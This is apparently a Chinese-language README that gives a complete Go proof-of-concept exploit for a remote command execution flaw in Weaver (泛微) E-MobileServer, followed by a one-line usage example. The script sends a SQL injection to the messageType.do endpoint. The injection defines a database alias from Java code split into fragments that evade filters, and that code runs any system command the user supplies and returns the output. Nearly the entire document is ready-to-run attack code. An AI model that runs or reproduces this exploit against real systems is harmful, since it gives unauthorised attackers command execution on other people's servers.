
## 泛微E-MobileServer远程命令执行漏洞

## go语言 poc
```go
package main

import (
        "bytes"
        "fmt"
        "github.com/hpifu/go-kit/hflag"
        "io/ioutil"
        "mime/multipart"
        "net/http"
        "net/url"
        "os"
        "strings"
)

func main() {
        t, c := getParam()
        exploit(t, c)
}

func exploit(host, command string) {
        p := "1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass(\"com.caucho.server.dispatch.ServletInvocation\").getMet','hod(\"getContextRequest\").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField(\"_response\");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod(\"getWriter\");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter(\"\\\\A\");writer.write(scan','ner.hasNext()?sca','nner.next():\"\");}');CALL MzSNqKsZTagm('" + url.QueryEscape(command) + "');--"
        c := http.Client{}
        buffer := &bytes.Buffer{}
        writer := multipart.NewWriter(buffer)
        field, _ := writer.CreateFormField("method")
        field.Write([]byte("create"))
        formField, _ := writer.CreateFormField("typeName")
        formField.Write([]byte(p))
        _ = writer.Close()
        target := strings.Replace(host+"/messageType.do", "//mess", "/mess", 1)
        request, _ := http.NewRequest(http.MethodPost, target, strings.NewReader(buffer.String()))
        request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36")
        request.Header.Set("Accept", "*/*")
        request.Header.Set("Connection", "close")
        request.Header.Set("Content-Type", writer.FormDataContentType())
        request.Header.Set("Content-Length", "1142")
        request.Header.Set("Accept-Encoding", "")
        do, err := c.Do(request)
        if err != nil {
                fmt.Println(err)
        }
        defer func() {
                _ = do.Body.Close()
        }()
        all, err := ioutil.ReadAll(do.Body)
        if err != nil {
                fmt.Println(err)
        }
        if string(all) == "{\"status\":false}" {
                fmt.Println("无效的命令,也许是服务器不支持或其他情况")
                return
        }
        result := strings.Replace(fmt.Sprintf("%s", all), "{\"status\":false,\"ID\":\"1\",\"msg\":\"推送类型已存在\"}", "", -1)
        fmt.Println("\n", result)
}

func getParam() (t, c string) {
        hflag.AddFlag("target", "泛微E-MobileServer-地址", hflag.Required(), hflag.Shorthand("t"))
        hflag.AddFlag("command", "待执行的系统命令", hflag.Required(), hflag.Shorthand("c"))
        if err := hflag.Parse(); err != nil {
                fmt.Println(hflag.Usage())
                os.Exit(0)
        }
        return hflag.GetString("target"), hflag.GetString("command")
}
```
## poc使用
```go run poc.go -t http://目标  -c 执行命令```
